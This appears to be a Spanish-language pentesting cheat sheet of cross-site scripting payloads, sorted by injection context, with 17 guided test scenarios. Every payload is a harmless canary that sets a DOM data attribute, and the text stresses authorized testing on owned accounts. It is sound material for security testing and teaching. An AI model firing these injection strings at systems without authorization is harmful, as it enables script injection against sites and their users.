# 🗡️ Cross-Site Scripting (XSS): payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### HTML entre etiquetas

```html
<img src=x onerror="document.documentElement.dataset.xss='xss-123'">
<svg onload="document.documentElement.dataset.xss='xss-123'"></svg>
<script>document.documentElement.dataset.xss='xss-123'</script>
```

**Cuándo usarlo:** Probar una alternativa cada vez si el valor llega a HTML sin escape. El script inline puede ser bloqueado por CSP y no se ejecuta al insertarlo con innerHTML.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts).


## 🧭 Payloads por contexto

### Atributos HTML según delimitador

```html
" autofocus onfocus="document.documentElement.dataset.xss='xss-123'" x="
' autofocus onfocus="document.documentElement.dataset.xss='xss-123'" x='
x onpointerenter=document.documentElement.dataset.xss=123 x
```

**Cuándo usarlo:** Primera línea: comillas dobles; segunda: simples; tercera: atributo sin comillas e interacción del puntero. Inspeccionar el DOM resultante.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts).


### JavaScript existente

```js
';document.documentElement.dataset.xss='xss-123';//
";document.documentElement.dataset.xss='xss-123';//
${document.documentElement.dataset.xss='xss-123'}
</script><img src=x onerror="document.documentElement.dataset.xss='xss-123'">
```

**Cuándo usarlo:** La primera variante requiere cadena entre comillas simples y debe comenzar con apóstrofo; la segunda exige comillas dobles, la tercera backticks y la cuarta un elemento script parseado como HTML.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts).


### URL de enlace

```text
javascript:document.documentElement.dataset.xss='xss-123'
javascript:void(document.documentElement.dataset.xss='xss-123')
```

**Cuándo usarlo:** Ambas variantes requieren un enlace href que permita javascript: y un clic real. CSP y navegador pueden impedirlo.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts).


### Fuentes DOM query y hash

```text
https://{ORIGEN}/page?q=%3Cimg%20src%3Dx%20onerror%3D%22document.documentElement.dataset.xss%3D123%22%3E
https://{ORIGEN}/page#%3Cimg%20src%3Dx%20onerror%3D%22document.documentElement.dataset.xss%3D123%22%3E
https://{ORIGEN}/page?q=%3Cscript%3Edocument.documentElement.dataset.xss%3D123%3C%2Fscript%3E
```

**Cuándo usarlo:** Query y hash son fuentes distintas y pueden requerir decodificación. La tercera línea solo corresponde a document.write; innerHTML no ejecuta script insertado así. Confirmar fuente→sink.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/dom-based).


## 🔥 Payloads avanzados

### RCDATA y cierre de elemento

```html
</textarea><img src=x onerror="document.documentElement.dataset.xss='xss-123'">
</title><img src=x onerror="document.documentElement.dataset.xss='xss-123'">
</script><img src=x onerror="document.documentElement.dataset.xss='xss-123'">
```

**Cuándo usarlo:** Usar únicamente si el valor se inserta dentro del elemento correspondiente. La prueba depende del parser HTML antes de cualquier evaluación JavaScript.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts).


### Escape incompleto y entidad en handler

```text
\';document.documentElement.dataset.xss='xss-123';//
&apos;;document.documentElement.dataset.xss='xss-123';//
" accesskey="x" onclick="document.documentElement.dataset.xss='xss-123'" x="
```

**Cuándo usarlo:** Primera línea: servidor escapa comilla pero no backslash; segunda: JS dentro de atributo HTML que decodifica entidad; tercera: input oculto o link/meta y combinación accesskey del navegador.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts).


## 🔬 Pruebas guiadas por escenario

### 1. HTML entre etiquetas

**Objetivo:** Usar solo cuando el valor cae como texto HTML sin escape.

```html
<img src=x onerror="document.body.dataset.xss='prueba-123'">
```

**Interpretación:** Confirmar que aparece el atributo en el DOM de la página; un reflejo textual o un recurso roto no confirma ejecución.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 2. Atributo entre comillas dobles

**Objetivo:** Cerrar un atributo HTML vulnerable y crear un handler de prueba.

```html
" autofocus onfocus="document.body.dataset.xss='prueba-123'" x="
```

**Interpretación:** Solo aplica a un atributo entre comillas. Comprobar el elemento final y si el foco realmente dispara el handler.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 3. URL de href

**Objetivo:** Verificar un sink URL que acepte javascript: en un enlace propio.

```html
javascript:document.body.dataset.xss='prueba-123'
```

**Interpretación:** Exige clic del auditor; comparar URL resuelta y política CSP. No equivale a ejecución automática.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 4. Cierre de script

**Objetivo:** Aplicar si el dato está dentro de un elemento script y se parsea primero como HTML.

```html
</script><img src=x onerror="document.body.dataset.xss='prueba-123'">
```

**Interpretación:** Verificar que se creó un nuevo elemento y ejecutó el handler; no usarlo si el contexto es JSON separado.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 5. Cadena JavaScript

**Objetivo:** Salir de una cadena con comillas simples y reparar la sintaxis posterior.

```js
';document.body.dataset.xss='prueba-123';//
```

**Interpretación:** Adaptar a comilla y contexto exactos; un SyntaxError sin ejecución no confirma XSS.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 6. Template literal

**Objetivo:** Usar cuando la entrada cae dentro de backticks en JavaScript.

```js
${document.body.dataset.xss='prueba-123'}
```

**Interpretación:** La expresión se evalúa dentro del template literal; confirmar en DOM y evitar inferirlo del reflejo.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 7. Fragmento DOM

**Objetivo:** Usar si la SPA copia location.hash a innerHTML u otro sink HTML.

```text
#<img src=x onerror="document.body.dataset.xss='prueba-123'">
```

**Interpretación:** Abrir la URL con fragmento en una sesión de prueba; comprobar fuente y sink en DevTools.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/dom-based).

### 8. Contenido almacenado

**Objetivo:** Enviar el canary a un campo propio que se renderice en otra vista.

```json
{"comment":"<img src=x onerror=\"document.body.dataset.xss='prueba-123'\">"}
```

**Interpretación:** Recargar con una segunda cuenta controlada; confirmar persistencia y ejecución sin exponer a usuarios reales.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 9. SVG con onload

**Objetivo:** Probar un contexto que permite SVG inline, no una imagen SVG aislada.

```html
<svg onload="document.body.dataset.xss='prueba-123'"></svg>
```

**Interpretación:** El handler debe ejecutarse bajo el origen objetivo; políticas CSP pueden bloquearlo.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 10. Atributo sin comillas

**Objetivo:** Probar un sink HTML cuyo valor de atributo no está delimitado.

```html
x onpointerenter=document.body.dataset.xss='prueba-123' x
```

**Interpretación:** Requiere interacción del puntero y que el parser genere un atributo nuevo; inspeccionar DOM final.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 11. Entidad HTML en handler

**Objetivo:** Probar decodificación de entidad antes de evaluar JavaScript en un atributo de evento.

```html
&apos;;document.body.dataset.xss='prueba-123';//
```

**Interpretación:** Solo aplica a una cadena JS dentro de un atributo HTML como onclick; el navegador decodifica la entidad antes del parser JS.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 12. Backslash antes de comilla

**Objetivo:** Comprobar escape incompleto de backslash en una cadena JavaScript.

```js
\';document.body.dataset.xss='prueba-123';//
```

**Interpretación:** El servidor debe escapar comillas pero no barras inversas para que la barra aportada neutralice su escape; verificar código final.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 13. Atributo entre comillas simples

**Objetivo:** Cerrar solo un valor HTML delimitado con comillas simples.

```html
' autofocus onfocus="document.body.dataset.xss='prueba-123'" x='
```

**Interpretación:** Inspeccionar el HTML final: debe existir un nuevo onfocus y dispararse en un elemento que acepte foco.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 14. Input hidden con accesskey

**Objetivo:** Probar un valor reflejado dentro de input type=hidden; requiere una combinación de teclas del auditor.

```html
" accesskey="x" onclick="document.body.dataset.xss='prueba-123'" x="
```

**Interpretación:** No basta autofocus porque el input está oculto. Verificar la tecla de acceso en el navegador real y el evento onclick.

**Fuente técnica:** [PortSwigger](https://portswigger.net/research/xss-in-hidden-input-fields).

### 15. Cadena JavaScript entre comillas dobles

**Objetivo:** Salir de una cadena JS delimitada por comillas dobles sin romper el resto del script.

```js
";document.body.dataset.xss='prueba-123';//
```

**Interpretación:** Comprobar el JavaScript generado y la ejecución. Esta variante no sustituye la prueba para comillas simples.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/contexts).

### 16. Query DOM hacia innerHTML

**Objetivo:** Usar cuando URLSearchParams alimenta innerHTML u otro sink que parsea HTML.

```text
https://{ORIGEN}/page?q=%3Cimg%20src%3Dx%20onerror%3D%22document.body.dataset.xss%3D123%22%3E
```

**Interpretación:** El navegador debe decodificar q y crear el img; localizar la asignación al sink, no inferir XSS del fragmento visible.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/dom-based).

### 17. Query DOM hacia document.write

**Objetivo:** Distinguir document.write, que parsea etiquetas script, de innerHTML.

```text
https://{ORIGEN}/page?q=%3Cscript%3Edocument.documentElement.dataset.xss%3D123%3C%2Fscript%3E
```

**Interpretación:** Solo aplica si el dato decodificado llega a document.write durante el parseo; verificar CSP y ejecución en DOM.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/dom-based).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
